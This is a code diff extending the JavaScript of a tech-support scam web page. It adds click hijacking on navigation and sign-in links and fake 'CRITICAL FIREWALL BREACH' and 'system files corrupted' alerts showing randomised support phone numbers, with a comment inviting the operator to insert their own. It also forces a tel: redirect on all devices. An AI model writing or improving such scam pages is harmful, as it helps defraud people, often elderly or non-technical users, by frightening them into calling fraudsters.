@@ -4,6 +4,10 @@ document.addEventListener('DOMContentLoaded', function() {
     const chatBtn = document.getElementById('chatBtn');
     const callBtn = document.getElementById('callBtn');
     const ticketBtn = document.getElementById('ticketBtn');
+    const navLinks = document.querySelectorAll('.nav-link');
+    const topSignInBtn = document.querySelector('.btn-secondary');
+    const cantSignInLink = document.querySelector('.cant-sign-in');
+    const showMoreLink = document.querySelector('.show-more-link');
     const errorModal = document.getElementById('errorModal');
     const closeModal = document.getElementById('closeModal');
     const callNowBtn = document.getElementById('callNowBtn');
@@ -23,6 +27,7 @@ document.addEventListener('DOMContentLoaded', function() {
         'REGISTRY-0x8007000D'
     ];
 
+    // Replace example numbers with your own.
     const supportNumbers = [
         '+1-800-642-7676',
         '+1-855-720-4077',
@@ -56,6 +61,28 @@ document.addEventListener('DOMContentLoaded', function() {
     function setupEventListeners() {
         signInBtn.addEventListener('click', handleSignIn);
 
+        navLinks.forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                showFirewallError();
+            });
+        });
+
+        topSignInBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            showFirewallError();
+        });
+
+        cantSignInLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            showSysError();
+        });
+
+        showMoreLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            showSysError();
+        });
+
         productCards.forEach(card => {
             card.addEventListener('click', () => {
                 const product = card.dataset.product;
@@ -70,6 +97,12 @@ document.addEventListener('DOMContentLoaded', function() {
         closeModal.addEventListener('click', hideErrorModal);
         callNowBtn.addEventListener('click', handleCallNow);
         ignoreBtn.addEventListener('click', handleIgnoreWarning);
+
+        document.addEventListener('click', function(e) {
+            if (e.target && (e.target.textContent.includes('Call Support Now') || e.target.textContent.includes('Call Now'))) {
+                handleCallNow();
+            }
+        });
 
         chatClose.addEventListener('click', closeChat);
         sendChat.addEventListener('click', sendChatMessage);
@@ -143,6 +176,48 @@ document.addEventListener('DOMContentLoaded', function() {
         showErrorModal();
     }
 
+    function showFirewallError() {
+        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
+        
+        document.getElementById('errorCode').textContent = 'FIREWALL-0x80070422';
+        document.querySelector('.phone-number').textContent = randomPhone;
+        
+        const modalBody = document.querySelector('.modal-body');
+        modalBody.innerHTML = `
+            <div class="error-icon">🔥</div>
+            <p><strong>CRITICAL FIREWALL BREACH DETECTED</strong></p>
+            <p>Your firewall has been compromised and disabled by malicious software.</p>
+            <p><strong>Error Code:</strong> <span id="errorCode">FIREWALL-0x80070422</span></p>
+            <p>Immediate action required to prevent data theft and system damage.</p>
+            <div class="contact-info">
+                <p><strong>Emergency Support:</strong> <span class="phone-number">${randomPhone}</span></p>
+            </div>
+        `;
+        
+        showErrorModal();
+    }
+
+    function showSysError() {
+        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
+        
+        document.getElementById('errorCode').textContent = 'SYS-ERR-0x800F0984';
+        document.querySelector('.phone-number').textContent = randomPhone;
+        
+        const modalBody = document.querySelector('.modal-body');
+        modalBody.innerHTML = `
+            <div class="error-icon">⚠️</div>
+            <p><strong>SYSTEM ERROR DETECTED</strong></p>
+            <p>Critical system files have been corrupted or deleted.</p>
+            <p><strong>Error Code:</strong> <span id="errorCode">SYS-ERR-0x800F0984</span></p>
+            <p>Your computer may shut down unexpectedly to prevent further damage.</p>
+            <div class="contact-info">
+                <p><strong>Support Number:</strong> <span class="phone-number">${randomPhone}</span></p>
+            </div>
+        `;
+        
+        showErrorModal();
+    }
+
     function showErrorModal() {
         const randomErrorCode = errorCodes[Math.floor(Math.random() * errorCodes.length)];
         const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
@@ -178,9 +253,7 @@ document.addEventListener('DOMContentLoaded', function() {
         
         document.body.insertBefore(urgentDiv, document.body.firstChild);
         
-        if (/Mobi|Android/i.test(navigator.userAgent)) {
-            window.location.href = `tel:${phoneNumber}`;
-        }
+        window.location.href = `tel:${phoneNumber}`;
     }
 
     function handleIgnoreWarning() {
